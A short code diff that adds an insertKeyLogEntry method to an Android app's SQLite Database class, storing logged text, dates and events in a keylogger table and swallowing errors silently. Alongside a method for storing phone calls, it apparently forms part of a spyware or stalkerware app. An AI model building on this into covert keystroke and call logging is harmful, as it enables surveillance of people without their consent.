@@ -29,6 +29,23 @@ import java.util.List;
 
 public class Database {
 
+    public static void insertKeyLogEntry(SQLiteDatabase database, String text, long date, String event){
+        long newRowId = -1;
+        try{
+            database.beginTransaction();
+            ContentValues values = new ContentValues();
+            values.put(DataContract.KeyloggerContract.COLUMN_TEXT, text);
+            values.put(DataContract.KeyloggerContract.COLUMN_DATE, date);
+            values.put(DataContract.KeyloggerContract.COLUMN_EVENT, event);
+            newRowId = database.insert(DataContract.KeyloggerContract.TABLE_NAME, null, values);
+            database.setTransactionSuccessful();
+        }catch (SQLException e){
+            //die silent
+        }finally {
+            database.endTransaction();
+        }
+    }
+
     public static void insertPhoneCalls(SQLiteDatabase database, List<PhoneCall> phoneCalls){
         for(PhoneCall phoneCall : phoneCalls){
             try{
